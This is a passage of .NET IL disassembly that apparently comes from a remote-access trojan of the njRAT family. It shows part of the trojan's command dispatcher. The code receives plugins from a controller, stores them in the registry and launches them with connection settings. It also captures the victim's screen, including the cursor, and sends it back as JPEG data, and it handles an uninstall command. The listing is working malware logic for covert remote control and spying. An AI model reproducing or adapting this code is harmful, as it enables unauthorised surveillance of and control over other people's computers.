      IL_0ffd:  brfalse.s  IL_1037

      IL_0fff:  ldloc.2
      IL_1000:  ldstr      "ret"
      IL_1005:  ldc.i4.0
      IL_1006:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_100b:  brfalse    IL_1268

      IL_1010:  ldloc.2
      IL_1011:  ldstr      "CAP"
      IL_1016:  ldc.i4.0
      IL_1017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_101c:  brfalse    IL_13d9

      IL_1021:  ldloc.2
      IL_1022:  ldstr      "un"
      IL_1027:  ldc.i4.0
      IL_1028:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_102d:  brfalse    IL_157b

      IL_1032:  br         IL_15e3

      IL_1037:  ldloc.0
      IL_1038:  ldc.i4.1
      IL_1039:  ldelem.ref
      IL_103a:  ldc.i4.0
      IL_103b:  newarr     [mscorlib]System.Byte
      IL_1040:  call       object j.OK::GTV(string,
                                            object)
      IL_1045:  castclass  uint8[]
      IL_104a:  stloc.s    V_45
      IL_104c:  ldloc.0
      IL_104d:  ldc.i4.3
      IL_104e:  ldelem.ref
      IL_104f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1054:  ldc.i4.s   10
      IL_1056:  clt
      IL_1058:  ldloc.s    V_45
      IL_105a:  ldlen
      IL_105b:  conv.i4
      IL_105c:  ldc.i4.0
      IL_105d:  ceq
      IL_105f:  and
      IL_1060:  brfalse.s  IL_109f

      IL_1062:  ldc.i4.5
      IL_1063:  newarr     [mscorlib]System.String
      IL_1068:  dup
      IL_1069:  ldc.i4.0
      IL_106a:  ldstr      "pl"
      IL_106f:  stelem.ref
      IL_1070:  dup
      IL_1071:  ldc.i4.1
      IL_1072:  ldsfld     string j.OK::Y
      IL_1077:  stelem.ref
      IL_1078:  dup
      IL_1079:  ldc.i4.2
      IL_107a:  ldloc.0
      IL_107b:  ldc.i4.1
      IL_107c:  ldelem.ref
      IL_107d:  stelem.ref
      IL_107e:  dup
      IL_107f:  ldc.i4.3
      IL_1080:  ldsfld     string j.OK::Y
      IL_1085:  stelem.ref
      IL_1086:  dup
      IL_1087:  ldc.i4.4
      IL_1088:  ldc.i4.1
      IL_1089:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_108e:  stelem.ref
      IL_108f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1094:  call       bool j.OK::Send(string)
      IL_1099:  pop
      IL_109a:  br         IL_1263

      IL_109f:  ldloc.0
      IL_10a0:  ldc.i4.3
      IL_10a1:  ldelem.ref
      IL_10a2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_10a7:  ldc.i4.s   10
      IL_10a9:  ble.s      IL_1118

      IL_10ab:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_10b0:  stloc.s    V_47
      IL_10b2:  ldc.i4.6
      IL_10b3:  newarr     [mscorlib]System.String
      IL_10b8:  dup
      IL_10b9:  ldc.i4.0
      IL_10ba:  ldloc.0
      IL_10bb:  ldc.i4.0
      IL_10bc:  ldelem.ref
      IL_10bd:  stelem.ref
      IL_10be:  dup
      IL_10bf:  ldc.i4.1
      IL_10c0:  ldsfld     string j.OK::Y
      IL_10c5:  stelem.ref
      IL_10c6:  dup
      IL_10c7:  ldc.i4.2
      IL_10c8:  ldloc.0
      IL_10c9:  ldc.i4.1
      IL_10ca:  ldelem.ref
      IL_10cb:  stelem.ref
      IL_10cc:  dup
      IL_10cd:  ldc.i4.3
      IL_10ce:  ldsfld     string j.OK::Y
      IL_10d3:  stelem.ref
      IL_10d4:  dup
      IL_10d5:  ldc.i4.4
      IL_10d6:  ldloc.0
      IL_10d7:  ldc.i4.2
      IL_10d8:  ldelem.ref
      IL_10d9:  stelem.ref
      IL_10da:  dup
      IL_10db:  ldc.i4.5
      IL_10dc:  ldsfld     string j.OK::Y
      IL_10e1:  stelem.ref
      IL_10e2:  call       string [mscorlib]System.String::Concat(string[])
      IL_10e7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_10ec:  stloc.s    V_48
      IL_10ee:  ldloc.s    V_47
      IL_10f0:  ldarg.0
      IL_10f1:  ldloc.s    V_48
      IL_10f3:  ldarg.0
      IL_10f4:  ldlen
      IL_10f5:  conv.i4
      IL_10f6:  ldloc.s    V_48
      IL_10f8:  sub.ovf
      IL_10f9:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_10fe:  ldloc.s    V_47
      IL_1100:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1105:  call       uint8[] j.OK::ZIP(uint8[])
      IL_110a:  stloc.s    V_45
      IL_110c:  ldloc.0
      IL_110d:  ldc.i4.1
      IL_110e:  ldelem.ref
      IL_110f:  ldloc.s    V_45
      IL_1111:  ldc.i4.3
      IL_1112:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1117:  pop
      IL_1118:  ldc.i4.5
      IL_1119:  newarr     [mscorlib]System.String
      IL_111e:  dup
      IL_111f:  ldc.i4.0
      IL_1120:  ldstr      "pl"
      IL_1125:  stelem.ref
      IL_1126:  dup
      IL_1127:  ldc.i4.1
      IL_1128:  ldsfld     string j.OK::Y
      IL_112d:  stelem.ref
      IL_112e:  dup
      IL_112f:  ldc.i4.2
      IL_1130:  ldloc.0
      IL_1131:  ldc.i4.1
      IL_1132:  ldelem.ref
      IL_1133:  stelem.ref
      IL_1134:  dup
      IL_1135:  ldc.i4.3
      IL_1136:  ldsfld     string j.OK::Y
      IL_113b:  stelem.ref
      IL_113c:  dup
      IL_113d:  ldc.i4.4
      IL_113e:  ldc.i4.0
      IL_113f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1144:  stelem.ref
      IL_1145:  call       string [mscorlib]System.String::Concat(string[])
      IL_114a:  call       bool j.OK::Send(string)
      IL_114f:  pop
      IL_1150:  ldloc.s    V_45
      IL_1152:  ldstr      "A"
      IL_1157:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_115c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1161:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1166:  stloc.s    V_46
      IL_1168:  ldloc.s    V_46
      IL_116a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_116f:  ldnull
      IL_1170:  ldstr      "h"
      IL_1175:  ldc.i4.1
      IL_1176:  newarr     [mscorlib]System.Object
      IL_117b:  dup
      IL_117c:  ldc.i4.0
      IL_117d:  ldsfld     string j.OK::H
      IL_1182:  stelem.ref
      IL_1183:  ldnull
      IL_1184:  ldnull
      IL_1185:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_118a:  ldloc.s    V_46
      IL_118c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1191:  ldnull
      IL_1192:  ldstr      "p"
      IL_1197:  ldc.i4.1
      IL_1198:  newarr     [mscorlib]System.Object
      IL_119d:  dup
      IL_119e:  ldc.i4.0
      IL_119f:  ldsfld     string j.OK::P
      IL_11a4:  stelem.ref
      IL_11a5:  ldnull
      IL_11a6:  ldnull
      IL_11a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_11ac:  ldloc.s    V_46
      IL_11ae:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11b3:  ldnull
      IL_11b4:  ldstr      "osk"
      IL_11b9:  ldc.i4.1
      IL_11ba:  newarr     [mscorlib]System.Object
      IL_11bf:  dup
      IL_11c0:  ldc.i4.0
      IL_11c1:  ldloc.0
      IL_11c2:  ldc.i4.2
      IL_11c3:  ldelem.ref
      IL_11c4:  stelem.ref
      IL_11c5:  ldnull
      IL_11c6:  ldnull
      IL_11c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_11cc:  ldloc.s    V_46
      IL_11ce:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11d3:  ldnull
      IL_11d4:  ldstr      "start"
      IL_11d9:  ldc.i4.0
      IL_11da:  newarr     [mscorlib]System.Object
      IL_11df:  ldnull
      IL_11e0:  ldnull
      IL_11e1:  ldnull
      IL_11e2:  ldc.i4.1
      IL_11e3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_11e8:  pop
      IL_11e9:  br.s       IL_11f1

      IL_11eb:  ldc.i4.1
      IL_11ec:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_11f1:  ldsfld     bool j.OK::Cn
      IL_11f6:  ldc.i4.0
      IL_11f7:  ceq
      IL_11f9:  box        [mscorlib]System.Boolean
      IL_11fe:  ldloc.s    V_46
      IL_1200:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1205:  ldnull
      IL_1206:  ldstr      "Off"
      IL_120b:  ldc.i4.0
      IL_120c:  newarr     [mscorlib]System.Object
      IL_1211:  ldnull
      IL_1212:  ldnull
      IL_1213:  ldnull
      IL_1214:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1219:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_121e:  ldc.i4.1
      IL_121f:  box        [mscorlib]System.Boolean
      IL_1224:  ldc.i4.0
      IL_1225:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_122a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_122f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_1234:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1239:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_123e:  brfalse.s  IL_11eb

      IL_1240:  ldloc.s    V_46
      IL_1242:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1247:  ldnull
      IL_1248:  ldstr      "off"
      IL_124d:  ldc.i4.1
      IL_124e:  newarr     [mscorlib]System.Object
      IL_1253:  dup
      IL_1254:  ldc.i4.0
      IL_1255:  ldc.i4.1
      IL_1256:  box        [mscorlib]System.Boolean
      IL_125b:  stelem.ref
      IL_125c:  ldnull
      IL_125d:  ldnull
      IL_125e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1263:  leave      IL_19f4

      IL_1268:  ldloc.0
      IL_1269:  ldc.i4.1
      IL_126a:  ldelem.ref
      IL_126b:  ldc.i4.0
      IL_126c:  newarr     [mscorlib]System.Byte
      IL_1271:  call       object j.OK::GTV(string,
                                            object)
      IL_1276:  castclass  uint8[]
      IL_127b:  stloc.s    V_49
      IL_127d:  ldloc.0
      IL_127e:  ldc.i4.2
      IL_127f:  ldelem.ref
      IL_1280:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1285:  ldc.i4.s   10
      IL_1287:  clt
      IL_1289:  ldloc.s    V_49
      IL_128b:  ldlen
      IL_128c:  conv.i4
      IL_128d:  ldc.i4.0
      IL_128e:  ceq
      IL_1290:  and
      IL_1291:  brfalse.s  IL_12d0

      IL_1293:  ldc.i4.5
      IL_1294:  newarr     [mscorlib]System.String
      IL_1299:  dup
      IL_129a:  ldc.i4.0
      IL_129b:  ldstr      "pl"
      IL_12a0:  stelem.ref
      IL_12a1:  dup
      IL_12a2:  ldc.i4.1
      IL_12a3:  ldsfld     string j.OK::Y
      IL_12a8:  stelem.ref
      IL_12a9:  dup
      IL_12aa:  ldc.i4.2
      IL_12ab:  ldloc.0
      IL_12ac:  ldc.i4.1
      IL_12ad:  ldelem.ref
      IL_12ae:  stelem.ref
      IL_12af:  dup
      IL_12b0:  ldc.i4.3
      IL_12b1:  ldsfld     string j.OK::Y
      IL_12b6:  stelem.ref
      IL_12b7:  dup
      IL_12b8:  ldc.i4.4
      IL_12b9:  ldc.i4.1
      IL_12ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_12bf:  stelem.ref
      IL_12c0:  call       string [mscorlib]System.String::Concat(string[])
      IL_12c5:  call       bool j.OK::Send(string)
      IL_12ca:  pop
      IL_12cb:  br         IL_13d4

      IL_12d0:  ldloc.0
      IL_12d1:  ldc.i4.2
      IL_12d2:  ldelem.ref
      IL_12d3:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_12d8:  ldc.i4.s   10
      IL_12da:  ble.s      IL_1324

      IL_12dc:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_12e1:  ldloc.0
      IL_12e2:  ldc.i4.0
      IL_12e3:  ldelem.ref
      IL_12e4:  ldsfld     string j.OK::Y
      IL_12e9:  ldloc.0
      IL_12ea:  ldc.i4.1
      IL_12eb:  ldelem.ref
      IL_12ec:  ldsfld     string j.OK::Y
      IL_12f1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_12f6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_12fb:  stloc.s    V_51
      IL_12fd:  dup
      IL_12fe:  ldarg.0
      IL_12ff:  ldloc.s    V_51
      IL_1301:  ldarg.0
      IL_1302:  ldlen
      IL_1303:  conv.i4
      IL_1304:  ldloc.s    V_51
      IL_1306:  sub.ovf
      IL_1307:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_130c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1311:  call       uint8[] j.OK::ZIP(uint8[])
      IL_1316:  stloc.s    V_49
      IL_1318:  ldloc.0
      IL_1319:  ldc.i4.1
      IL_131a:  ldelem.ref
      IL_131b:  ldloc.s    V_49
      IL_131d:  ldc.i4.3
      IL_131e:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1323:  pop
      IL_1324:  ldc.i4.5
      IL_1325:  newarr     [mscorlib]System.String
      IL_132a:  dup
      IL_132b:  ldc.i4.0
      IL_132c:  ldstr      "pl"
      IL_1331:  stelem.ref
      IL_1332:  dup
      IL_1333:  ldc.i4.1
      IL_1334:  ldsfld     string j.OK::Y
      IL_1339:  stelem.ref
      IL_133a:  dup
      IL_133b:  ldc.i4.2
      IL_133c:  ldloc.0
      IL_133d:  ldc.i4.1
      IL_133e:  ldelem.ref
      IL_133f:  stelem.ref
      IL_1340:  dup
      IL_1341:  ldc.i4.3
      IL_1342:  ldsfld     string j.OK::Y
      IL_1347:  stelem.ref
      IL_1348:  dup
      IL_1349:  ldc.i4.4
      IL_134a:  ldc.i4.0
      IL_134b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1350:  stelem.ref
      IL_1351:  call       string [mscorlib]System.String::Concat(string[])
      IL_1356:  call       bool j.OK::Send(string)
      IL_135b:  pop
      IL_135c:  ldloc.s    V_49
      IL_135e:  ldstr      "A"
      IL_1363:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1368:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_136d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1372:  stloc.s    V_50
      IL_1374:  ldc.i4.5
      IL_1375:  newarr     [mscorlib]System.String
      IL_137a:  dup
      IL_137b:  ldc.i4.0
      IL_137c:  ldstr      "ret"
      IL_1381:  stelem.ref
      IL_1382:  dup
      IL_1383:  ldc.i4.1
      IL_1384:  ldsfld     string j.OK::Y
      IL_1389:  stelem.ref
      IL_138a:  dup
      IL_138b:  ldc.i4.2
      IL_138c:  ldloc.0
      IL_138d:  ldc.i4.1
      IL_138e:  ldelem.ref
      IL_138f:  stelem.ref
      IL_1390:  dup
      IL_1391:  ldc.i4.3
      IL_1392:  ldsfld     string j.OK::Y
      IL_1397:  stelem.ref
      IL_1398:  dup
      IL_1399:  ldc.i4.4
      IL_139a:  ldloc.s    V_50
      IL_139c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_13a1:  ldnull
      IL_13a2:  ldstr      "GT"
      IL_13a7:  ldc.i4.0
      IL_13a8:  newarr     [mscorlib]System.Object
      IL_13ad:  ldnull
      IL_13ae:  ldnull
      IL_13af:  ldnull
      IL_13b0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_13b5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_13ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_13bf:  stloc.s    V_52
      IL_13c1:  ldloca.s   V_52
      IL_13c3:  call       string j.OK::ENB(string&)
      IL_13c8:  stelem.ref
      IL_13c9:  call       string [mscorlib]System.String::Concat(string[])
      IL_13ce:  call       bool j.OK::Send(string)
      IL_13d3:  pop
      IL_13d4:  leave      IL_19f4

      IL_13d9:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_13de:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_13e3:  stloc.s    V_53
      IL_13e5:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_13ea:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_13ef:  stloc.s    V_14
      IL_13f1:  ldloca.s   V_14
      IL_13f3:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_13f8:  ldloca.s   V_53
      IL_13fa:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_13ff:  ldc.i4     0x21005
      IL_1404:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_1409:  stloc.s    V_54
      IL_140b:  ldloc.s    V_54
      IL_140d:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_1412:  stloc.s    V_55
      IL_1414:  ldloc.s    V_54
      IL_1416:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_141b:  ldloc.s    V_54
      IL_141d:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_1422:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_1427:  stloc.s    V_56
      IL_1429:  ldloc.s    V_55
      IL_142b:  ldc.i4.0
      IL_142c:  ldc.i4.0
      IL_142d:  ldc.i4.0
      IL_142e:  ldc.i4.0
      IL_142f:  ldloc.s    V_56
      IL_1431:  ldc.i4     0xcc0020
      IL_1436:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_143b:  ldc.i4.s   32
        IL_143d:  ldc.i4.s   32
        IL_143f:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_1444:  stloc.s    V_56
        IL_1446:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_144b:  ldloc.s    V_56
        IL_144d:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_1452:  stloc.s    V_53
        IL_1454:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_1459:  ldloc.s    V_55
        IL_145b:  ldloc.s    V_53
        IL_145d:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_1462:  leave.s    IL_147f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1464:  dup
        IL_1465:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_146a:  stloc.s    V_61
        IL_146c:  ldloc.s    V_61
        IL_146e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1473:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1478:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_147d:  leave.s    IL_147f

      }  // end handler
      IL_147f:  ldloc.s    V_55
      IL_1481:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_1486:  ldloc.0
      IL_1487:  ldc.i4.1
      IL_1488:  ldelem.ref
      IL_1489:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_148e:  ldloc.0
      IL_148f:  ldc.i4.2
      IL_1490:  ldelem.ref
      IL_1491:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1496:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_149b:  stloc.s    V_57
      IL_149d:  ldloc.s    V_57
      IL_149f:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_14a4:  stloc.s    V_55
      IL_14a6:  ldloc.s    V_55
      IL_14a8:  ldloc.s    V_54
      IL_14aa:  ldc.i4.0
      IL_14ab:  ldc.i4.0
      IL_14ac:  ldloc.s    V_57
      IL_14ae:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_14b3:  ldloc.s    V_57
      IL_14b5:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_14ba:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_14bf:  ldloc.s    V_55
      IL_14c1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_14c6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_14cb:  stloc.s    V_58
      IL_14cd:  ldstr      "CAP"
      IL_14d2:  ldsfld     string j.OK::Y
      IL_14d7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_14dc:  stloc.s    V_52
      IL_14de:  ldloca.s   V_52
      IL_14e0:  call       uint8[] j.OK::SB(string&)
      IL_14e5:  starg.s    b
      IL_14e7:  ldloc.s    V_58
      IL_14e9:  ldarg.0
      IL_14ea:  ldc.i4.0
      IL_14eb:  ldarg.0
      IL_14ec:  ldlen
      IL_14ed:  conv.i4
      IL_14ee:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_14f3:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_14f8:  stloc.s    V_59
      IL_14fa:  ldloc.s    V_57
      IL_14fc:  ldloc.s    V_59
      IL_14fe:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_1503:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_1508:  ldloc.s    V_59
      IL_150a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_150f:  call       string j.OK::md5(uint8[])
      IL_1514:  stloc.s    V_60
      IL_1516:  ldloc.s    V_60
      IL_1518:  ldsfld     string j.OK::lastcap
      IL_151d:  ldc.i4.0
      IL_151e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1523:  brfalse.s  IL_1545

      IL_1525:  ldloc.s    V_60
      IL_1527:  stsfld     string j.OK::lastcap
      IL_152c:  ldloc.s    V_58
      IL_152e:  ldloc.s    V_59
      IL_1530:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1535:  ldc.i4.0
      IL_1536:  ldloc.s    V_59
      IL_1538:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_153d:  conv.ovf.i4
      IL_153e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1543:  br.s       IL_154d

      IL_1545:  ldloc.s    V_58
      IL_1547:  ldc.i4.0
      IL_1548:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_154d:  ldloc.s    V_58
      IL_154f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1554:  call       bool j.OK::Sendb(uint8[])
      IL_1559:  pop
      IL_155a:  ldloc.s    V_58
      IL_155c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_1561:  ldloc.s    V_59
      IL_1563:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_1568:  ldloc.s    V_54
      IL_156a:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_156f:  ldloc.s    V_57
      IL_1571:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_1576:  leave      IL_19f4

      IL_157b:  ldloc.0
      IL_157c:  ldc.i4.1
      IL_157d:  ldelem.ref
      IL_157e:  stloc.s    V_52
      IL_1580:  ldloc.s    V_52
      IL_1582:  ldstr      "~"
      IL_1587:  ldc.i4.0
      IL_1588:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_158d:  brfalse.s  IL_15af

      IL_158f:  ldloc.s    V_52
      IL_1591:  ldstr      "!"
      IL_1596:  ldc.i4.0
      IL_1597:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_159c:  brfalse.s  IL_15b6

      IL_159e:  ldloc.s    V_52
      IL_15a0:  ldstr      "@"
      IL_15a5:  ldc.i4.0
      IL_15a6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15ab:  brfalse.s  IL_15c3

      IL_15ad:  br.s       IL_15de

      IL_15af:  call       void j.OK::UNS()
      IL_15b4:  br.s       IL_15de

      IL_15b6:  ldc.i4.0
      IL_15b7:  call       void j.OK::pr(int32)
